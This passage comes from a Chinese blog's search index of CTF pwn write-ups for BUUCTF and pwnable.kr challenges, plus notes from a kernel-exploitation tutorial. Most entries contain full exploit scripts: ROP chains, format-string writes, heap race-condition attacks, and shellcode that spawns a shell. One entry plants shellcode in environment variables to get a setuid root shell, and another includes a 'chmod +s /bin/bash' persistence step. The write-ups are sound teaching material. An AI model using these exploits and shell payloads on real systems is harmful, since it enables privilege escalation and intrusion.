p32_ex(0x40149b)[:3]+p8(val) * 5 # pop rdi payload += p32_ex(0x404020)[:3]+p8(val) * 5 payload += p32_ex(0x401499)[:3]+p8(val) * 5 # pop rsi payload += p32_ex(0x403f98)[:3]+p8(val) * 5 payload += p32_ex(0x403f98)[:3]+p8(val) * 5 payload += p32_ex(0x401080)[:3]+p8(val) * 5 # leak payload += p32_ex(0x40149b)[:3]+p8(val) * 5 # pop rdi payload += p32_ex(0x404140)[:3]+p8(val) * 5 # cin payload += p32_ex(0x401499)[:3]+p8(val) * 5 # pop rsi payload += p32_ex(fake_rbp+0x18)[:3]+p8(val) * 5 payload += p32_ex(fake_rbp+0x18)[:3]+p8(val) * 5 payload += p32_ex(0x401030)[:3]+p8(val) * 5 # read payload += p32_ex(0x40149b)[:3]+p8(val) * 5 # pop rdi payload += p32_ex(fake_rbp)[:3]+p8(val) * 5 # payload += p32_ex(0x40125f)[:3]+p8(val) * 5 # leave ret payload= payload.ljust(0x3f0, b\"a\") payload += b\"deadbeef\" * 2 sla(\"Please input string (will be truncated to 1024 characters): \", payload) ru(b\"deadbeef\" * 2) m = rl() rbp_val = u64_ex(m[:-1]) log_address(\"rbp_val\", rbp_val) assert (rbp_val \u0026 0xff) in (0xb0, ), \"try again!\" sla(\"Please input delimiters: \", p8_ex(rbp_val)+b\"\\x00\"*7 + p64(0x4042a8)) io.recvuntil(b\"deadbeef\" * 2, timeout=4) m = io.recv(timeout=4) set_current_libc_base_and_log(u64_ex(m[-6:]), 0x9f1b0) # stop() sl(p64(libc.sym.gets)[:6]) sleep(1) rop = ROP(libc, base = libc.address) rop.mprotect(fake_rbp\u0026~0xfff, 0x1000, 7) rop.call(fake_rbp+0x80) rop.raw(b\"\\x90\"*0x100 + ShellcodeMall.amd64.execve_bin_sh) sl(flat({0x10: rop.chain()})) ia() 远程爆破一下就好，运气很好，第一次就成功了： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-11","objectID":"/zh-cn/2022-04-11-buuctf-isitdtu2019-tokenizer/:0:0","tags":["pwn"],"title":"BUUCTF-isitdtu2019_tokenizer","uri":"/zh-cn/2022-04-11-buuctf-isitdtu2019-tokenizer/"},{"categories":["pwn-wp"],"content":"总结\r也不算太baby，很有意思的一道题。 Checksec\r远程为libc-2.23.so。 漏洞点\r在check_passwd分支： 然后在后面的strcpy可以溢出 利用思路\r最后返回时候存在对key的检查，所以需要爆破出key。同时，key对应的位置也有残留的地址，可以利用strncmp爆破出来。 爆破key 泄露pie地址 rop+栈迁移 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] context.update(timeout=3) def check_passwd(data : bytes, clear=False): io.sendafter(\"\u003e\u003e \", \"1\", timeout=5) io.sendafter(\"Your passowrd :\", data, timeout=3) m = io.recvline(timeout=5) if b\"Failed\" in m: return 0 elif b\"Success\" in m: if clear: io.sendafter(\"\u003e\u003e \", \"1\", timeout=5) sleep(1) return 1 else: print(m) error(\"WTF!\") def copy(data=None): sa(\"\u003e\u003e \", \"3\") if not data: data = \"#\"*0x3f sa(\"Copy :\", data) def brute_passwd(passwd=b\"\", length=0x10): for i in range(length): for x in range(1, 0x100): if check_passwd(passwd + p8(x)+b\"\\x00\", clear=1): passwd += p8(x) break log_ex(f\"current passwd: {passwd}\") return passwd \"\"\" 1. get passswd 2. get code base 3. get libc base 4. rop \"\"\" # 1. get passswd ori_passwd = brute_passwd() # 2. get code base check_passwd(flat({ 0: \"\\x00\", 0x3f:\"#\" })) copy() sa(\"\u003e\u003e \", \"1\") # clear passwd = brute_passwd(b\"\", length=6) code_base = u64_ex(passwd) - 0xb70 log_code_base_addr(code_base) # 0x00000000000010c1: pop rsi; pop r15; ret; # 0x00000000000010c3: pop rdi; ret; # 0x0000000000000bd0: pop rbp; ret; # 0x0000000000000d0d: leave; ret; check_passwd(flat({ 0: \"\\x00\", 0x40:ori_passwd, 0x68: code_base + 0xca0 # read_input })) copy() sla(\"\u003e\u003e \", \"2\") sleep(1) bss_addr = code_base+0x202840 s(flat({ 0: bss_addr, 0x20: [ code_base + 0x00000000000010c3, # pop rdi code_base + 0x201F60, # puts@got code_base+0xae0, # puts@plt code_base + 0x00000000000010c3, # pop rdi bss_addr, # bss addr, code_base + 0x00000000000010c1, 0x400, 0,# pop rsi r15 code_base + 0xca0, # read_input code_base + 0x0000000000000bd0, # pop rbp bss_addr, # bss code_base+0x0000000000000d0d ] })) libc_base = recv_current_libc_addr(offset=libc.sym.puts) log_libc_base_addr(libc_base) libc.address = libc_base sleep(1) s(flat([ bss_addr+0x200, # rbp code_base+0x00000000000010c3, libc.search(b\"/bin/sh\").__next__(), libc.sym.system ])) ia() 远程有点问题，经常IO Error，本地效果如下： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-05","objectID":"/zh-cn/2022-04-05-buuctf-pwnable-babystack/:0:0","tags":["pwn"],"title":"buuctf-pwnable_babystack","uri":"/zh-cn/2022-04-05-buuctf-pwnable-babystack/"},{"categories":["pwn-wp"],"content":"总结\r直接把远程的源码和password下载下来然后修改一下逻辑即可获得flag。 EXP\r#include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cfcntl.h\u003e char flag[100]; char password[100]; char* key = \"3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+\"; void calc_flag(char* s){ int i; for(i=0; i\u003cstrlen(s); i++){ flag[i] = s[i] ^ key[i]; } printf(\"%s\\n\", flag); } int main(){ FILE* fp = fopen(\"./password\", \"r\"); fgets(password, 100, fp); char buf[100]; printf(\"guess the password!\\n\"); fgets(buf, 128, stdin); if(strcmp(password, buf)){ // 这里改一下即可 printf(\"congrats! here is your flag: \"); calc_flag(password); } else{ printf(\"wrong guess!\\n\"); exit(0); } return 0; } 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-05","objectID":"/zh-cn/2022-04-05-buuctf-pwnable-blukat/:0:0","tags":["pwn"],"title":"buuctf-pwnable_blukat","uri":"/zh-cn/2022-04-05-buuctf-pwnable-blukat/"},{"categories":["pwn-wp"],"content":"总结\r环境变量利用或者argv的利用。 Checksec\r带有suid。 漏洞点\r调试发现，edx实际为argv0 利用思路\r远程开启了ASLR，所以需要猜测下栈地址，不过由于是32位，所以猜对的概率还是很大的。远程有python，可以利用python来输入不可见字符。 这里直接利用环境变量，首先导出足够多的环境变量： for i in $(seq 1 500); do export RODERICK_$i=$(python -c 'print \"\\x90\"*0x1000+\"j1X\\xcd\\x80\\x89\\xc3jFX\\x89\\xd9\\xcd\\x80jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80\"');done; 后面的shellcode为：asm(shellcraft.i386.linux.setreuid()+shellcraft.i386.linux.sh()) 利用execl等函数，将argv0修改为一个栈地址；当然也可以用exec命令，使用-a选项：exec -a $(python -c \"print '\\xc0\\xc0\\xc0\\xff'\") ./tiny_easy \u0026 多试几次即可获得root shell EXP\rfor i in $(seq 1 500); do export RODERICK_$i=$(python -c 'print \"\\x90\"*0x1000+\"j1X\\xcd\\x80\\x89\\xc3jFX\\x89\\xd9\\xcd\\x80jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80\"');done; exec -a $(python -c \"print '\\xc0\\xc0\\xc0\\xff'\") ./tiny_easy \u0026 打远程： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-05","objectID":"/zh-cn/2022-04-05-buuctf-pwnable-tiny-easy/:0:0","tags":["pwn"],"title":"buuctf-pwnable_tiny_easy","uri":"/zh-cn/2022-04-05-buuctf-pwnable-tiny-easy/"},{"categories":["pwn-wp"],"content":"总结\r直接用scp从远程主机下载二进制文件分析，你会发现远程主机执行的实际是x64文件而不是x86，并且开启了PIE防护。 Checksec\r可以直接下载远程的libc和ld，然后patchelf。 漏洞点\r附上远程主机上的源码： #include \u003cstdio.h\u003e #include \u003calloca.h\u003e #include \u003cfcntl.h\u003e unsigned long long key; char buf[100]; char buf2[100]; int fsb(char** argv, char** envp){ char* args[]={\"/bin/sh\", 0}; int i; char*** pargv = \u0026argv; char*** penvp = \u0026envp; char** arg; char* c; for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\\0'; for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\\0'; *pargv=0; *penvp=0; for(i=0; i\u003c4; i++){ printf(\"Give me some format strings(%d)\\n\", i+1); read(0, buf, 100); printf(buf); } printf(\"Wait a sec...\\n\"); sleep(3); printf(\"key : \\n\"); read(0, buf2, 100); unsigned long long pw = strtoull(buf2, 0, 10); if(pw == key){ printf(\"Congratz!\\n\"); setuid(0); setgid(0); execve(args[0], args, 0); return 0; } printf(\"Incorrect key \\n\"); return 0; } int main(int argc, char* argv[], char** envp){ int fd = open(\"/dev/urandom\", O_RDONLY); if( fd==-1 || read(fd, \u0026key, 8) != 8 ){ printf(\"Error, tell admin\\n\"); return 0; } close(fd); alloca(0x12345 \u0026 key); fsb(argv, envp); // exploit this format string bug! return 0; } 非栈上的格式化字符串漏洞利用，虽然一开始栈随机降低了，但是可以根据地址计算出偏移。 利用思路\r首先利用格式化字符串漏洞泄露出有用的栈地址和程序加载地址，计算出基地址 利用rbp跳板，在栈上布置key的地址 将key的内容写为0 获取root shell 执行chmod +s /bin/bash，避免掉线 EXP\r写了个脚本手动输入一下然后交互： #!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * # %11$p,%14$p,%18$p,### log_ex(\"please input: %11$p,%14$p,%18$p,###\") m = input(\"Gie me the input: \") stack1, code1, stack2, *_ = m.split(\",\") stack1 = int16_ex(stack1) code1 = int16_ex(code1) stack2 = int16_ex(stack2) codebase = code1 - 0xcb8 log_code_base_addr(codebase) log_address(\"stack1\", stack1) log_address(\"stack2\", stack2) offset = 7 + (stack2 - stack1) // 8 log_ex(f\"offset: {offset}\") key_addr = codebase + 0x202040 log_address(\"key addr\", key_addr) if key_addr \u0026 0xffffffff \u003e= 0x7ffffffff: errlog_ex_highlight(\"try again!\") first_payload = f\"%{key_addr \u0026 0xffffffff}c%18$n\".ljust(0x18, \"X\") second_payload = f\"%{offset}$ln\".ljust(0x18, \"X\") log_ex(f\"The first payload: {first_payload}\") log_ex(f\"The second payload: {second_payload}\") 等待一会儿输入第二段payload，然后输入key为0： 成功的一次： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-05","objectID":"/zh-cn/2022-04-05-buuctf-pwnable-fsb/:0:0","tags":["pwn"],"title":"buuctf-pwnable_fsb","uri":"/zh-cn/2022-04-05-buuctf-pwnable-fsb/"},{"categories":["pwn-wp"],"content":"总结\r多线程条件竞争，经调试分析与阅读源码，总结在多线程下释放tcache管理大小范围内的堆块的时候，流程大概如下： 线程申请tcache_perthread_struct结构体，这里会使用mmap申请 将堆块释放到线程对应的tcache bins中 线程结束时调用tcache_shutdown，将当前线程tcache bins所管理的chunk都使用__libc_free释放掉，这时的tcache变量为NULL，所以肯定不会进tcache bins，而会进入到fastbins/unsorted bins。 Checksec\r远程为libc-2.27.so，可以double free的版本。 漏洞点\r其实这个程序很多地方都有栈溢出，但是由于使用的都是sscanf/strlen/sprintf等字符串类型的函数，会被\\x00截断，所以不太好绕过canary，否则直接利用栈溢出就能解题。首先泄露地址可以任选一个有栈溢出的函数，然后泄露栈上残留的地址即可，这里我选用的是echo函数： 还有一个主要利用的点，是多线程下全局变量的条件竞争： 这里故意设置了sleep(1)就是为竞争创造条件。 利用思路\r首先利用echo泄露出libc地址 利用条件竞争漏洞，首先泄露出堆地址，做法为：调用两次add，然后调用1次count，等待1秒，这个时候该线程已经分配的2个属于memo的chunk都释放掉了，此时主线程调用GET /list即可泄露堆地址仍 然后利用条件竞争漏洞，让两个线程去释放同一个chunk，构造出A-\u003eB-\u003eA的fastbin链 分配A，此时由于tcache stash unlink，就会把剩下的B/A都会放到tcache bins中去，这里可以使用url_encode编码，使得memo的长度满足要求 分配到strstr@got，修改为system@plt 输入/bin/sh;获取shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def get_list(keep_alive=True): payload = \"GET /list deadbeef \\n\" if keep_alive: payload += \"Connection: keep-alive\\r\\n\\r\\n\" s(payload) m = r() return m def post_add(memo, count=1, keep_alive=True): assert len(memo) \u003c= 80, \"memo wrong!\" if isinstance(memo, str): memo = memo.encode() payload = b\"POST /add deadbeef \\n\" if keep_alive: payload += b\"Connection: keep-alive\\r\\n\\r\\n\" payload += b\"memo=\" + memo + b\"\u0026count=\"+ str(count).encode() s(payload) m = r() return m def post_count(keep_alive=True): payload = \"POST /count deadbeef \\n\" if keep_alive: payload += \"Connection: keep-alive\\r\\n\\r\\n\" s(payload) m = r() return m def post_echo(content, keep_alive=True): payload = \"POST /echo deadbeef \\n\" if keep_alive: payload += \"Connection: keep-alive\\r\\n\\r\\n\" payload += f\"content={content}\" s(payload) m = r() return m def url_encode(addr, length): addr = hex(addr)[2:].zfill(16) res = \"\" for i in range(0, 16, 2): res = \"%\"+addr[i:i+2] + res return res.ljust(length, \"X\") # leak libc addr m = post_echo(\"a\"*0xa7+\"#\") i = m.find(b\"#\") assert i \u003e= 0, \"index error!\" libc_base = u64_ex(m[i+1:i+7]) - 0x10bf0 log_address(\"libc_base\", libc_base) assert libc_base \u0026 0xfff == 0, \"libc error\" post_add(\"a\"*0x30, 1) post_add(\"b\"*0x30, 1) post_count() sleep(1) m = get_list() heap_base = u32_ex(m[0xc5:0xc5+4]) - 0x280 log_heap_base_addr(heap_base) sleep(3) post_add(\"a\"*0x30, 1) # 0 post_add(\"b\"*0x30, 1) # 1 post_add(\"c\"*0x30, 1) # 2 post_add(\"c\"*0x40, 3) # 3 post_count() sleep(2) post_add(p32(heap_base + 0x280), 1) post_count() sleep(6) post_add(url_encode(elf.got.strstr, 0x30), 1) # 0 post_add(\"a\"*0x30, 1) post_add(\"b\"*0x30, 1) post_add(url_encode(libc.sym.system + libc_base, 0x30), 1) sleep(2) sl(\"/bin/sh;\") ia() 多试几次就可以拿到shell了。 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-04","objectID":"/zh-cn/2022-04-04-shanghai2018-memo-server/:0:0","tags":["pwn"],"title":"shanghai2018_memo_server","uri":"/zh-cn/2022-04-04-shanghai2018-memo-server/"},{"categories":["pwn-wp"],"content":"总结\r自定义了一套函数调用流程，手动模拟了push/pop/call/ret等。分析清楚每个指令的实现后，即可利用栈上的变量进行利用。 Checksec\r远程环境不影响。 漏洞点\r这里直接看汇编，更容易发现漏洞点。在message函数中： 这里要输入name的时候，直接从栈上取的变量，可控制。 长度可以位为负数，之后可以栈溢出。还可以发现，循环变量都是从栈上取的，也可以控制循环的次数。 利用思路\r程序最后回到上一层使用的是： 一开始的想法是控制这里的ebp，即可进行栈迁移。后来在写exp的过程中发现，在getnline(name, xxx)的时候，就已经可以rop了。 思路如下： 首先利用栈溢出泄露出stack地址 伪造name和name_len，读入name，触发rop 修改栈的可执行权限，执行shellcode即可 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] sla(\"Input name : \", \"roderick\") sla(\"Message length : \", \"-1\") sa(\"Input message : \", \"a\"*0x2b+\"$\") ru(\"$\") m = rn(4) stack_addr = u32_ex(m) log_address_ex(\"stack_addr\") sla(\"Change name? (y/n) : \", \"n\") sla(\"Message length : \", \"-1\") sa(\"Input message : \", flat({ 0x20-4: [ 3, # i 0, 0,0, \"dead\", # *rbp 0, stack_addr - 0xc4 - 0x60, # name 0x1000, # name_len 4 # let's try again ] })) payload = [ elf.plt.mprotect, stack_addr - 0x80, (stack_addr - 0x104) \u0026 ~0xfff, 0x2000, 7, \"\\x90\" * 0x100, ShellcodeMall.i386.execve_bin_sh ] sla(\"Input name : \", flat({ 28:payload })) ia() 打远程： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-04","objectID":"/zh-cn/2022-04-04-shadow-mna-2016/:0:0","tags":["pwn"],"title":"shadow_mna_2016","uri":"/zh-cn/2022-04-04-shadow-mna-2016/"},{"categories":["pwn-wp"],"content":"2022DASCTFXSU三月春季挑战赛-Pwn-Wp\r今天终于有空来写下wp，比赛那天恰好有事，所以就上午做了下题。最后一题的CVE-2022-0185在学习中，未完待续。 2022-03-31: 更新了wedding的exp，可打远程。 2022-04-09：忘记更新了，补上第三题。 Checkin\r这题最开始想用one gadget去做，后来发现libc-2.31的one gadget都比较严格，于是换成puts泄露再读取输入执行system(\"/bin/sh\")。 Checksec\r漏洞点\r栈溢出，可溢出0x10字节，覆盖掉rbp和ret。 利用思路\r观察0x4011BF处的汇编可知，rax等于rbp-0xb0，然后在0x4011CB处将rax赋值给了rsi，因此，只要控制了rbp，相当于可以在任意地址处写入0xb0个字节。 至少两种思路，主要后面不一样。 思路一： 栈迁移到bss段 控制rbp后再进入0x4011BF，然后在bss段上rop 使用partial overwrite 修改read@got，使其为syscall; ret。这里由于read的地址偏移为0xff0，加个0x10直接进位了，所以还有半个字节需要猜测一下，概率为1/16 使用read控制rax为10，并修改read@got，随即利用ret2csu执行mprotect(bss, 0x1000, 7) 跳转到准备好的shellcode执行获取shell 思路二： 栈迁移到bss段 控制rbp后再进入0x4011BF，然后在bss段上rop 使用magic gadget：add [rbp-0x3d], ebx; ret，将setvbuf@got修改为puts的地址 泄露出read地址，计算得到system地址 再次read读取输入，跳转执行system('/bin/sh')即可 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] if gift.remote: libc = ELF('./libc.so.6') gift['libc'] = libc pop_rdi_ret = CurrentGadgets.pop_rdi_ret() pop_rsi_r15_ret = CurrentGadgets.pop_rsi_r15_ret() leave_ret = CurrentGadgets.leave_ret() magic = CurrentGadgets.magic_gadget() pop_rbp_ret = CurrentGadgets.pop_rbp_ret() ret = CurrentGadgets.ret() read_again = 0x4011bf bss_addr = 0x404080 + 0xa00 def exp_magic(): pop_rbx_rbp_r12131415 = 0x40124a # 栈迁移到bss段 payload = flat({ 0xa0: [ bss_addr+0xa0, read_again ] }) s(payload) libc_puts = libc.sym.puts libc_setvbuf = libc.sym.setvbuf offset = (libc_puts - libc_setvbuf) if libc_puts \u003e libc_setvbuf else (0x100000000 + libc_puts - libc_setvbuf) # 修改setvbuf为puts payload = flat( { 0: [ pop_rbx_rbp_r12131415, offset, elf.got.setvbuf+0x3d, 0, 0, 0, 0, magic, ret, pop_rdi_ret, elf.got.read, elf.plt.setvbuf, pop_rbp_ret, bss_addr+0xa0, read_again ], 0xa0: [ bss_addr - 8, leave_ret ] } ) s(payload) read_addr = u64_ex(rl()[:-1]) libc_base = read_addr - libc.sym.read log_libc_base_addr(libc_base) libc.address = libc_base # 读取输入，执行system('/bin/sh') payload = flat({ 0:[ pop_rdi_ret, libc.search(b\"/bin/sh\").__next__(), libc.sym.system ], 0x70: leave_ret, 0xa0: [ bss_addr - 8, leave_ret ] }) s(payload) sleep(1) sl(\"cat /flag\") m = rls(\"flag\") if b\"flag\" in m: log_ex(f\"Get flag: {m}\") ia() def exp_partial_write(): bss_addr = elf.got.setvbuf # 栈迁移 layout = { 0xa0: [ bss_addr+0xa0, read_again ] } s(flat(layout)) # rop1 layout = { 0xa0: [ bss_addr, leave_ret ], 0: [ bss_addr+0x68, pop_rsi_r15_ret, elf.got.read-8, 0, elf.plt.read, 0x40124a, # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret 0, # rbx 2, # rbp bss_addr \u0026 ~0xfff, 0x1000, 7, elf.got.read, 0x401230, # csu up ShellcodeMall.amd64.execve_bin_sh ] } s(flat(layout)) s(b\"a\"*8 + p16(0x8000)) sleep(1) sl(\"cat /flag\") m = rls(\"flag\") if b\"flag\" in m: log_ex(f\"Get flag: {m}\") ia() if __name__ == \"__main__\": # for i in $(seq 1 20); do ./exp.py de ./checkin -nl ; done # try: # exp_partial_write() # except: # pass exp_magic() 打远程： 爆破： Wedding\r这题刚开始被libc给坑了，最开始本地使用的是2.31-0ubuntu9.2_amd64调试的，这个版本的file_jump_table是可写的；但是远程给的是2.31-0ubuntu9.7_amd64，这个版本的file_jump_table都是不可写的。因为我最初使用的思路是改写stdout-\u003eflags为/bin/sh，修改_IO_file_jumps-\u003e_IO_file_xsputn为system去拿shell，所以那天上午爆破了好久都失败了……所以以后，还是老老实实用给的libc去调试吧。调试的时候建议关闭aslr。 Checksec\r漏洞点\rprepare中没有校验offset： revise中没有校验index: 建议把这个标识变量改一下，要不然wish/wlsh/w1sh容易看花眼。。。 利用思路\r题目给的条件为： 可以分配任意大小的内存 可以在任意偏移处覆盖，但是只能覆盖为0x135或者0x1314，覆盖机会为3次 可以在heap任意偏移处的指针写入8或者3个字节，各有1次机会。 当然，上面说的任意也不是完全任意，受限于my_read只读取8个字节，所以实际能控制的偏移（数字）为：-9999999到99999999。 我们知道，在申请内存足够大，大概大于128K的时候，会调用mmap映射虚拟内存页，此时映射的虚拟内存页会位于libc.so映射空间的上方。此时的偏移可控，也就是可以修改libc.so上的任意的数据，修改的内容为2字节，固定。 由于没有地址，朴素的想法就是先泄露地址，因此，打_IO_2_1_stdout_结构体去泄露地址。有地址后就好办了，思路为： 申请大内存，利用任意偏移修改stdout-\u003eflags和stdout-\u003e_IO_write_base，泄露地址并计算出PIE基地址和libc基地址 利用一个跳板，和两次分别写8/3字节的机会，修改change3和change8为小负数，这样就能继续写很多次。我选择的跳板在0x3e20偏移处，第一次可以写8个字节，修改为任意地址，第二次就能将change3修改为小负数 然后，使用0x4008这个跳板，就可以把change8也修改为小负数 继续使用跳板，将stderr-\u003evtable修改为_IO_str_jumps；将_IO_2_1_stderr_+131处修改为sh;；将__free_hook修改为system；将stderr-\u003eflags","date":"2022-03-28","objectID":"/zh-cn/2022-03-28-2022dasctfxsu%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/:0:0","tags":["pwn"],"title":"2022DASCTFXSU三月春季挑战赛-pwn-wp","uri":"/zh-cn/2022-03-28-2022dasctfxsu%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/"},{"categories":["pwn-wp"],"content":" 一道经典的内核入门题目解析。 基础知识\rKernel\r一图胜千言： 需要注意的是，linux内核是单内核。因此，内核基本拥有对系统绝对的控制权。而微内核架构中，内核其实只负责寻址、内存管理、进程通信等基础功能。 状态切换\r在学习SROP的时候，介绍过一个系统调用sigreturen，该系统调用结束后，会恢复用户态栈，进而继续执行用户态代码。这里介绍一下在软中断场景下，内核与用户态发生的切换过程。还是先看图： 图中所经历的过程为： 内核代替进程接受信号，将信号放入对应进程的信号队列中，同时将进程标记为suspend状态，然后从用户态切换到内核态 陷入内核态后，内核会将用户态的寄存器状态逐一保存起来，形成一个ucontext结构，然后压入信号信息和sigreturn代码。随后，进入内核内部的工作。 若注册了信号处理函数，那么程序控制权会回到用户进程，然后进入到signal handler函数进行处理，处理完成后会执行栈上的指令，也就是sigreturn系统调用 进程重新陷入内核，通过sigreturen恢复用户态上下文信息 控制权返还给用户态进程，恢复寄存器等信息，继续在用户态执行 那么在用户态切换到内核态，具体的过程为： 通过swapgs指令切换GS段寄存器 将当前用户态的栈的栈顶记录到CPU的独占变量区域中，然后将该区域内的内核栈栈顶放入rsp 通过push保存用户态的所有寄存器的值 通过汇编指令判断是否为x32_abi 通过系统调用号，跳转到全局变量sys_table_table相应的位置继续执行系统调用 在linux-4.4.7，目录arch/x86/entry/entry_64.S： ENTRY(entry_SYSCALL_64) /* * Interrupts are off on entry. * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON, * it is too small to ever cause noticeable irq latency. */ SWAPGS_UNSAFE_STACK /* * A hypervisor implementation might want to use a label * after the swapgs, so that it can do the swapgs * for the guest and jump here on syscall. */ GLOBAL(entry_SYSCALL_64_after_swapgs) ; 存放用户态的rsp movq %rsp, PER_CPU_VAR(rsp_scratch) ; 把内核态的栈顶赋值给rsp movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp /* Construct struct pt_regs on stack */ ; 保存各个寄存器的值 pushq $__USER_DS /* pt_regs-\u003ess */ pushq PER_CPU_VAR(rsp_scratch) /* pt_regs-\u003esp */ /* * Re-enable interrupts. * We use 'rsp_scratch' as a scratch space, hence irq-off block above * must execute atomically in the face of possible interrupt-driven * task preemption. We must enable interrupts only after we're done * with using rsp_scratch: */ ENABLE_INTERRUPTS(CLBR_NONE) pushq %r11 /* pt_regs-\u003eflags */ pushq $__USER_CS /* pt_regs-\u003ecs */ pushq %rcx /* pt_regs-\u003eip */ pushq %rax /* pt_regs-\u003eorig_ax */ pushq %rdi /* pt_regs-\u003edi */ pushq %rsi /* pt_regs-\u003esi */ pushq %rdx /* pt_regs-\u003edx */ pushq %rcx /* pt_regs-\u003ecx */ pushq $-ENOSYS /* pt_regs-\u003eax */ pushq %r8 /* pt_regs-\u003er8 */ pushq %r9 /* pt_regs-\u003er9 */ pushq %r10 /* pt_regs-\u003er10 */ pushq %r11 /* pt_regs-\u003er11 */ sub $(6*8), %rsp /* pt_regs-\u003ebp, bx, r12-15 not saved */ testl $_TIF_WORK_SYSCALL_ENTRY, ASM_THREAD_INFO(TI_flags, %rsp, SIZEOF_PTREGS) jnz tracesys entry_SYSCALL_64_fastpath: #if __SYSCALL_MASK == ~0 cmpq $__NR_syscall_max, %rax #else andl $__SYSCALL_MASK, %eax cmpl $__NR_syscall_max, %eax #endif ja 1f /* return -ENOSYS (already in pt_regs-\u003eax) */ movq %r10, %rcx ; 跳转到sys_call_table去执行 call *sys_call_table(, %rax, 8) 而pt_regs结构体的定义为在arch\\x86\\include\\asm\\ptrace.h struct pt_regs { /* * C ABI says these regs are callee-preserved. They aren't saved on kernel entry * unless syscall needs a complete, fully filled \"struct pt_regs\". */ unsigned long r15; unsigned long r14; unsigned long r13; unsigned long r12; unsigned long rbp; unsigned long rbx; /* These regs are callee-clobbered. Always saved on kernel entry. */ unsigned long r11; unsigned long r10; unsigned long r9; unsigned long r8; unsigned long rax; unsigned long rcx; unsigned long rdx; unsigned long rsi; unsigned long rdi; /* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */ unsigned long orig_rax; /* Return frame for iretq */ unsigned long rip; unsigned long cs; unsigned long eflags; unsigned long rsp; unsigned long ss; /* top of stack page */ }; 可以看到，在rip的上方，还有cs、eflags、rsp、ss。 从内核态切换为用户态的流程为： 使用swapgs指令，切换GS段寄存器 使用iretq或者sysret恢复到用户空间继续执行，需要注意的是如果使用iretq还需要恢复一些寄存器的值。还有一个sysexit指令也可以退出，但是该指令是intel独有的。 内核编译\r内核编译，直接说步骤： 从内核镜像源，国内推荐清华源下载，如下载linux-4.4.7版本的内核： curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.7.tar.gz 验证内核是否被篡改 解压 make menuconfig，这里主要需要关注的是： Kernel hacking —-\u003e Kernel debugging Kernel hacking —-\u003e Compile-time checks and compiler options —-\u003e Compile the kernel with debug info Kernel hacking —-\u003e Generic Kernel Debugging Instruments —\u003e KGDB: kernel debugger kernel hacking —-\u003e Compile the kernel with frame pointers 基本上不需要改动，直接保存退出即可。 make -j8 bzImage 编译结束后，在arch/x86/boot/目录下，有bzImage Busyb","date":"2022-03-12","objectID":"/zh-cn/2022-03-12-kernel-pwn-babydriver/:0:0","tags":["pwn"],"title":"kernel-pwn-babydriver","uri":"/zh-cn/2022-03-12-kernel-pwn-babydriver/"},{"categories":["pwn-wp"],"content":"简介\r有些题目很碎，直接搞一个合集吧，收录20个题目，大部分都是buuctf上面的，还有其他的题目。 Hitcon_2018_hackergame_2018_calc\r这道题主要的考点在于使用-0x80000000/-1时也会触发异常。另外，有些软件和很多编程语言提供交互式的shell，比如vi/vim/python/python3/python/nmap/irb/perl。这里试了下，远程含有vim。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() # trigger exception sla(\"\u003e\u003e\u003e \", \"-2147483648/-1\") sla(\"Program crashed! You can run a program to examine:\\n\", 'vim') sl(\":!sh\") ia() 远程： Ciscn_2019_nw_6\r一道关于snprintf的格式化字符串的题，输入在堆上，可借助ebp链完成利用。就当printf做即可。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] libc: ELF = gift['libc'] if gift.remote: libc = ELF(\"/home/roderick/glibc-all-in-one/buuctf_libc/x86/libc-2.27.so\") data = \"roderick\"+\"%p,\"*20 sla(\"please input the key:\\n\", data) m = rl().split(b\",\") log_ex(f\"{m}\") stack_addr = int16_ex(m[7]) libc_addr = int16_ex(m[16]) target_addr = stack_addr + 4 libc_base = libc_addr - libc.sym['__libc_start_main'] - 241 libc.address = libc_base 